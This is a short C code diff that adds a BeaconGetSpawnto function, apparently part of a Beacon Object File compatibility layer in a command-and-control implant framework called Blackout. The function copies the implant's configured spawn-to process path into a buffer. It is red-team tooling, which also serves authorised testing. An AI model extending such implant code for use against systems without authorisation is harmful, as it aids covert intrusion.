@@ -16,6 +16,14 @@ FUNC char *my_strchr(const char *str, int ch) {
     return NULL;
 }
 
+FUNC void BeaconGetSpawnto( BOOL x86, char* buffer, int length ) {
+	BLACKOUT_INSTANCE
+	if ( !buffer )
+		return;
+
+	MmCopy( buffer, Blackout().Fork.Spawnto, length );
+}
+
 FUNC void BeaconDataParse(datap* parser, char* buffer, int size) {
     if (parser == NULL) {
         return;
